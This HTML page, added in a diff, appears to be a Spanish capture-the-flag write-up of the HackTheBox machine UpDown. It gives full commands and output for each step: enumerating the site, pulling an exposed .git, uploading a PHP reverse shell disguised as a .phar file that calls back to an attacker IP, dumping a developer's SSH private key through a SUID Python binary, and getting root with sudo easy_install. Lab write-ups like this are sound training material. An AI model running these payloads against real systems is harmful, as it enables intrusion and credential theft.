@@ -1,0 +1,358 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup UpDown HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/updown.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup UpDown HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina UpDown de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina UpDown de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup UpDown HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup UpDown HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina UpDown de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup UpDown HackTheBox</h1>
+          <p>Resolución de la máquina UpDown de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.177
+Nmap scan report for 10.10.11.177
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Desde curl podemos ver la web con html2text, encontramos un dominio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s 10.10.11.177 | </span><span class="s2">html2text</span><span class="p">
+
+*** Welcome,
+Is My Website UP ? ***
+*** Here you can check if your website is up or down. ***
+Website to check:
+
+[site] ⁰  Debug mode (On/Off)
+[Check]
+</span><span class="kd">siteisup.htb</span>
+</code></pre></div></div>
+
+<div><p>Fuzzeando directorios con gobuster podemos encontrar /dev</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u siteisup.htb -t 100
+===============================================================
+[+] Url:                     http://siteisup.htb
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/dev</span><span class="p">                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]</span>
+</code></pre></div></div>
+
+<div><p>Podemos seguir fuzzeando directorios pero ahora sobre /dev, encontramos un .git</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u siteisup.htb/dev -t 100
+===============================================================
+[+] Url:                     http://siteisup.htb/dev
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/.git</span><span class="p">                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]</span>
+</code></pre></div></div>
+
+<div><p>Mirando con curl y html2text podemos encontrar componentes de un proyecto de github</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s http://siteisup.htb/dev/.git/ | </span><span class="s2">html2text</span><span class="p">
+***** Index of /dev/.git *****
+[[ICO]]       Name             Last_modified    Size Description
+==========================================================================
+[[PARENTDIR]] Parent_Directory                    -  
+[[   ]]       HEAD             2021-10-20 19:40   21  
+[[DIR]]       branches/        2021-10-20 19:40    -  
+[[   ]]       config           2021-10-20 19:42  298  
+[[   ]]       description      2021-10-20 19:40   73  
+[[DIR]]       hooks/           2021-10-20 19:40    -  
+[[   ]]       index            2021-10-20 19:42  521  
+[[DIR]]       info/            2021-10-20 19:40    -  
+[[DIR]]       logs/            2021-10-20 19:40    -  
+[[DIR]]       objects/         2021-10-20 19:40    -  
+[[   ]]       packed-refs      2021-10-20 19:40  112  
+[[DIR]]       refs/            2021-10-20 19:40    -  
+==========================================================================
+     Apache/2.4.41 (Ubuntu) Server at siteisup.htb Port 80</span>
+</code></pre></div></div>
+
+<div><p>Procedemos a descargarlo de manera recursiva con wget</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget </span><span class="p">-c -r -np -nc -L -p http://siteisup.htb/dev/.git/ &>/dev/null
+
+</span></code></pre></div></div>
+
+<div><p>Ahora entramos en la carpeta y procedemos a leer los commits del proyecto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">siteisup.htb/dev</span><span class="s2"> ❯ git</span><span class="p"> log --oneline
+</span><span class="no">010dcc3 (</span><span class="k">HEAD -></span><span class="s2"> main</span><span class="no">,</span><span class="kd"> origin/main</span><span class="no">,</span><span class="kd"> origin/HEAD</span><span class="no">)</span><span class="p"> Delete index.php
+</span><span class="no">c8fcc40 </span><span class="p">Update checker.php
+</span><span class="no">f67efd0 </span><span class="p">Create checker.php
+</span><span class="no">ab9bc16 </span><span class="p">Update changelog.txt
+</span><span class="no">60d2b32 </span><span class="p">Create admin.php
+</span><span class="no">c1998f8 </span><span class="p">Add admin panel.
+</span><span class="no">35a3801 </span><span class="p">Update changelog.txt
+</span><span class="no">57af03b </span><span class="p">Create index.php
+</span><span class="no">354fe06 </span><span class="p">Delete .htpasswd
+</span><span class="no">8812785 </span><span class="na">New technique in header to protect our dev vhost.
+</span><span class="no">bc4ba79 </span><span class="p">Update .htaccess
+</span><span class="no">61e5cc0 </span><span class="p">Update index.php
+</span><span class="no">3d66cd4 </span><span class="p">Create changelog.txt
+</span><span class="no">4fb1927 </span><span class="p">Create stylesheet.css
+</span><span class="no">6f89af7 </span><span class="p">Create index.php
+</span><span class="no">8d1beb1 </span><span class="p">Create .htpasswd
+</span><span class="no">6ddcc7a </span><span class="p">Create .htaccess</span>
+</code></pre></div></div>
+
+
+<div><p>Hay un commit con una tecnica de protección del vhost dev mediante header?</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">siteisup.htb/dev</span><span class="s2"> ❯ git</span><span class="p"> show 8812785
+</span><span class="no">commit 8812785e31c879261050e72e20f298ae8c43b565</span><span class="p">
+Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
+Date:   Wed Oct 20 16:38:54 2021 +0200
+
+    New technique in header to protect our dev vhost.
+
+diff --git a/.htaccess b/.htaccess
+index 44ff240..b317ab5 100644
+--- a/.htaccess
++++ b/.htaccess
+</span><span class="na">@@ -2,3 +2,4 @@ </span><span class="p">SetEnvIfNoCase </span><span class="kd">Special-Dev "only4dev" </span><span class="p">Required-Header
+ Order Deny,Allow
+ Deny from All
+ Allow from env=Required-Header
+</span><span class="kd">+</span>
+</code></pre></div></div>
+
+<div><p>Tenemos varias cosas, primero un subdominio dev que podemos comprobar con gobuster</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u siteisup.htb -t 100
+===============================================================
+[+] Url:          http://siteisup.htb
+[+] Threads:      100
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">dev.siteisup.htb</span><span class="p"> (Status: 403) [Size: 281]</span>
+</code></pre></div></div>
+
+<div><p>Al abrirlo en el navegador solo podemos ver forbidden</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>La teoria es que con ese header deberiamos tener acceso asi que lo agregamos a burpsuite</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Desde el navegador de burpsuite al abrirlo y ver la web parece que podemos subir archivos</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Revisando el proyecto vemos que tenemos deshabilitadas funciones como system o shell_exec, afortunadamente proc_open esta habilitado y hay una <a href="https://www.php.net/manual/en/function.proc-open.php">forma </a>de crear una reverse shell</p></div>
+
+<div><p>Hay que cambiar algunas cosas, iniciando por el intérprete en este caso usaremos bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">$process </span><span class="kd">=</span><span class="k"> proc_open</span><span class="p">(</span><span class="s2">'bash'</span><span class="p">, $descriptorspec, $pipes, $cwd, $env);</span>
+</code></pre></div></div>
+
+<div><p>También hay que cambiar el comando a ejecutar, usaremos una reverse shell de bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">fwrite</span><span class="p">($pipes[</span><span class="na">0</span><span class="p">], </span><span class="s2">'bash -i >& /dev/tcp/10.10.14.10/443 0>&'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div><p>Al final solo con lo más básico nos quedaria algo asi el php con reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+$descriptorspec </span><span class="kd">= array</span><span class="p">(
+   </span><span class="na">0</span><span class="kd"> => array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">, </span><span class="s2">"r"</span><span class="p">),
+   </span><span class="na">1</span><span class="kd"> => array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">, </span><span class="s2">"w"</span><span class="p">),
+   </span><span class="na">2</span><span class="kd"> => array</span><span class="p">(</span><span class="s2">"file"</span><span class="p">, </span><span class="s2">"/tmp/error-output.txt"</span><span class="p">, </span><span class="s2">"a"</span><span class="p">)
+);
+
+$cwd </span><span class="kd">=</span><span class="s2"> '/tmp'</span><span class="p">;
+$env </span><span class="kd">= array(</span><span class="s2">'some_option'</span><span class="kd"> =></span><span class="s2"> 'aeiou'</span><span class="p">);
+$process </span><span class="kd">=</span><span class="k"> proc_open</span><span class="p">(</span><span class="s2">'bash'</span><span class="p">, $descriptorspec, $pipes, $cwd, $env);
+
+</span><span class="kd">if </span><span class="p">(</span><span class="kd">is_resource</span><span class="p">($process)) {
+    </span><span class="k">fwrite</span><span class="p">($pipes[</span><span class="na">0</span><span class="p">], </span><span class="s2">'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'</span><span class="p">);
+    </span><span class="k">fclose</span><span class="p">($pipes[</span><span class="na">0</span><span class="p">]);
+    </span><span class="k">fclose</span><span class="p">($pipes[</span><span class="na">1</span><span class="p">]);
+
+}
+?></span>
+</code></pre></div></div>
+
+<div><p>Ahora tenemos otro problema y es que extensiones php, phtml y otras estan bloqueadas, por suerte la extensión phar esta funcionando asi que usaremos esa extensión</p></div>
+
+<div><p>Ahora seleccionamos nuestro archivo phar y lo subimos en la web</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Una vez lo subimos vamos a /uploads y vemos una carpeta nueva con nombre en md5</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Entramos a la carpeta y podemos ver nuestro archivo .phar, lo ejecutamos y nos llega la shell</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.177
+</span><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ hostname -I
+10.10.11.177 dead:beef::250:56ff:feb9:e28b 
+</span><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando archivos con privilegios suid encontramos uno en el home de developer</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null | grep -v usr
+/home/developer/dev/siteisup
+</span><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver que además del binario hay un archivo en python de lo que hace</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/home/developer/dev</span><span class="p">$ ls
+</span><span class="kd">siteisup</span><span class="s2">  siteisup_test.py</span><span class="p">
+</span><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/home/developer/dev</span><span class="p">$ cat siteisup_test.py
+import requests
+
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+	print "Website is up"
+else:
+	print "Website is down"
+</span><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/home/developer/dev</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutar el binario, en el campo input podemos ejecutar algo en python que nos ejecute un comando, en este caso intentaremos leer la id_rsa de developer</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@updown</span><span class="p">:</span><span class="na">/home/developer/dev</span><span class="p">$ ./siteisup
+Welcome to 'siteisup.htb' application
+
+</span><span class="kd">Enter URL here:</span><span class="p"> __import__('os').system('cat /home/developer/.ssh/id_rsa')
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Con la id_rsa nos podemos conectar por ssh como developer y leer la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> developer@10.10.11.177 -i id_rsa
+</span><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1002(developer) gid=1002(developer) groups=1002(developer)
+</span><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.177 dead:beef::250:56ff:feb9:e28b 
+</span><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+b7a**************************5b9
+</span><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando los sudoers encontramos que podemos ejecutar easy_install como root sin contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for developer on localhost:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User developer may run the following commands on localhost:
+    (</span><span class="na">ALL</span><span class="p">) NOPASSWD: </span><span class="kd">/usr/local/bin/easy_install</span><span class="p">
+</span><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ayudarnos de <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">gtfobins</a> y obtener una bash, ahora estamos como el usuario root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo "import os;os.system('bash')" > setup.py
+</span><span class="s2">developer@updown</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo easy_install .
+WARNING: The easy_install command is deprecated and will be removed in a future version.
+Processing .
+Writing /home/developer/setup.cfg
+Running setup.py -q bdist_egg --dist-dir /home/developer/egg-dist-tmp-Hm2TR2
+</span><span class="s2">root@updown</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@updown</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.177 dead:beef::250:56ff:feb9:e28b 
+</span><span class="s2">root@updown</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+057**************************5e8
+</span><span class="s2">root@updown</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
